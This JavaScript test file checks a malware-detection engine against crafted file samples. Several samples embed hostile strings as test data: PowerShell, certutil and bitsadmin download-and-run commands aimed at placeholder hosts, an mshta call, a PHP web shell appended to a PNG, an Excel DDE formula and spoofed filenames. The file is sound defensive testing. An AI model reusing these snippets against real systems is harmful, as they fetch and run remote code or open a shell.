'use strict';

/*
  تحليل البرمجيات الخبيثة: عينات مصنوعة بأساليب حقيقية (بلا أي حمولة فعلية) تمر على محرك الملفات.
  ملفات تنفيذية متنكرة، RLO، مسافات قبل الامتداد، ماكرو (بما فيه docx أُعيدت تسميته)، ماكرو يشتغل تلقائياً،
  PDF بـ JavaScript تلقائي أو Launch، أرشيف ZIP يحوي برنامجاً أو اختصاراً متنكراً، صور بحمولة بعد نهايتها،
  PowerShell و LOLBins، HTA/VBS/JS، APK و ISO، حقن صيغ Excel، وملفات سليمة يجب ألا تُتهم.
*/

const test = require('node:test');
const assert = require('node:assert/strict');
const e = require('../public/js/detection-engine.js');

function pe({ packed = false, signed = false, dll = false } = {}) {
  const b = Buffer.alloc(4096); b.write('MZ', 0); b.writeUInt32LE(0x80, 0x3c); b.write('PE\0\0', 0x80);
  b.writeUInt16LE(0x14c, 0x84); b.writeUInt16LE(2, 0x86); b.writeUInt16LE(0xe0, 0x94); b.writeUInt16LE(dll ? 0x2102 : 0x102, 0x96);
  b.writeUInt16LE(0x10b, 0x98);
  const sec = 0x98 + 0xe0; b.write(packed ? 'UPX0' : '.text', sec); b.write(packed ? 'UPX1' : '.data', sec + 40);
  if (signed) { b.writeUInt32LE(0x1000, 0x98 + 96 + 4 * 8); b.writeUInt32LE(0x200, 0x98 + 96 + 4 * 8 + 4); }
  if (packed) for (let i = 1024; i < 4096; i++) b[i] = (i * 2654435761 >>> 24) & 255;
  return b;
}
function zipWith(names) {   // ZIP بسيط: ترويسات محلية + دليل مركزي بأسماء الملفات
  const parts = [], cd = []; let off = 0;
  for (const n of names) { const nb = Buffer.from(n); const h = Buffer.alloc(30); h.writeUInt32LE(0x04034b50, 0); h.writeUInt16LE(nb.length, 26); parts.push(h, nb); 
    const c = Buffer.alloc(46); c.writeUInt32LE(0x02014b50, 0); c.writeUInt16LE(nb.length, 28); c.writeUInt32LE(off, 42); cd.push(c, nb); off += 30 + nb.length; }
  const cdb = Buffer.concat(cd); const end = Buffer.alloc(22); end.writeUInt32LE(0x06054b50, 0); end.writeUInt16LE(names.length, 8); end.writeUInt16LE(names.length, 10); end.writeUInt32LE(cdb.length, 12); end.writeUInt32LE(off, 16);
  return Buffer.concat([...parts, cdb, end]);
}
const jpg = Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0]), Buffer.alloc(200, 1), Buffer.from([0xff, 0xd9])]);
const png = Buffer.concat([Buffer.from('89504e470d0a1a0a', 'hex'), Buffer.alloc(100, 2), Buffer.from('0000000049454e44ae426082', 'hex')]);
const SAMPLES = [
  ['sales.csv', Buffer.from('name,total\nAli,=SUM(B2:B9)\n'), 'safe'], ['setup.zip', zipWith(['setup/readme.md', 'setup/app.exe']), 'warning'],
  ['backup.zip', zipWith(['photos/', 'photos/a.jpg', 'docs/cv.pdf']), 'safe'], ['big-secret.jpg', Buffer.concat([jpg, Buffer.from('PK\x03\x04'), Buffer.alloc(30), Buffer.from('hidden.exe'), Buffer.alloc(200, 7)]), 'warning'],
  // [name, bytes, expected: 'danger'|'warning'|'safe']
  ['invoice.pdf.exe', pe(), 'danger'], ['photo.jpg', pe(), 'danger'], ['setup.exe', pe({ packed: true }), 'warning'],
  ['tool.exe', pe({ signed: true }), 'warning'], ['report.scr', pe(), 'danger'], ['update.dll', pe({ dll: true }), 'warning'],
  ['salary‮fdp.exe', pe(), 'danger'], ['doc.pdf      .exe', pe(), 'danger'],
  ['invoice.docm', zipWith(['[Content_Types].xml', 'word/document.xml', 'word/vbaProject.bin']), 'danger'],
  ['invoice.docx', zipWith(['[Content_Types].xml', 'word/document.xml', 'word/vbaProject.bin']), 'danger'],
  ['clean.docx', zipWith(['[Content_Types].xml', 'word/document.xml', 'word/styles.xml']), 'safe'],
  ['photos.zip', zipWith(['IMG_001.jpg', 'IMG_002.jpg.exe']), 'danger'], ['docs.zip', zipWith(['a.pdf', 'b.txt']), 'safe'],
  ['payload.zip', zipWith(['run.js', 'readme.txt']), 'warning'], ['shortcut.zip', zipWith(['Invoice.pdf.lnk']), 'danger'],
  ['bank.pdf', Buffer.from('%PDF-1.7\n1 0 obj<</Type/Catalog/OpenAction 2 0 R>>endobj 2 0 obj<</S/JavaScript/JS(app.alert(1))>>endobj\n%%EOF'), 'danger'],
  ['launch.pdf', Buffer.from('%PDF-1.4\n1 0 obj<</S/Launch/F(cmd.exe)>>endobj\n%%EOF'), 'danger'],
  ['clean.pdf', Buffer.from('%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n%%EOF'), 'safe'],
  ['fake.pdf', Buffer.from('<html><script>location="https://evil.example"</script></html>'), 'warning'],
  ['run.ps1', Buffer.from('$c=New-Object Net.WebClient;IEX($c.DownloadString("http://x/a.ps1")) -enc JABjAD0A -w hidden'), 'danger'],
  ['readme.txt', Buffer.from('powershell -nop -w hidden -enc SQBFAFgA'), 'danger'],
  ['install.bat', Buffer.from('@echo off\ncertutil -urlcache -split -f http://x/a.exe %TEMP%\\a.exe & start %TEMP%\\a.exe'), 'danger'],
  ['invoice.hta', Buffer.from('<html><script language="VBScript">CreateObject("WScript.Shell").Run "mshta http://x"</script></html>'), 'danger'],
  ['order.vbs', Buffer.from('Set s=CreateObject("WScript.Shell"):s.Run "cmd /c bitsadmin /transfer j http://x/a.exe"'), 'danger'],
  ['secret.jpg', Buffer.concat([jpg, Buffer.from('PK\x03\x04'), Buffer.alloc(30), Buffer.from('hidden.exe'), Buffer.alloc(200, 7)]), 'warning'], ['photo.jpg', jpg, 'safe'], ['logo.png', png, 'safe'],
  ['image.png', Buffer.concat([png, Buffer.from('<?php system($_GET[c]); ?>')]), 'danger'],
  ['app.apk', zipWith(['AndroidManifest.xml', 'classes.dex', 'resources.arsc']), 'warning'],
  ['disk.iso', Buffer.concat([Buffer.alloc(0x8001), Buffer.from('CD001')]), 'warning'],
  ['notes.txt', Buffer.from('اجتماع الغد الساعة العاشرة'), 'safe'], ['data.csv', Buffer.from('=cmd|"/c calc"!A1,b\n1,2'), 'warning'],
  ['script.js', Buffer.from('var s=new ActiveXObject("WScript.Shell");s.Run("powershell -enc AAA")'), 'danger'],
  ['macro.xls', Buffer.concat([Buffer.from('d0cf11e0a1b11ae1', 'hex'), Buffer.alloc(600), Buffer.from('_VBA_PROJECT AutoOpen Shell')]), 'danger'],
];

const ORDER = { safe: 0, warning: 1, danger: 2 };
test('عينات البرمجيات الخبيثة والملفات السليمة', async t => {
    for (const [name, bytes, expect] of SAMPLES) {
        await t.test(`${expect.padEnd(7)} ${JSON.stringify(name)}`, () => {
            const r = e.analyzeFile({ name, size: bytes.length, head: new Uint8Array(bytes.subarray(0, 1 << 20)), tail: new Uint8Array(bytes.subarray(Math.max(0, bytes.length - 262144))) });
            const why = (r.reasons || []).filter(x => x.type !== 'info').map(x => x.text).join(' | ');
            if (expect === 'safe') assert.equal(r.level, 'safe', `${r.score}% ${why}`);
            else assert.ok(ORDER[r.level] >= ORDER[expect], `${r.level} ${r.score}% ${why}`);
        });
    }
});
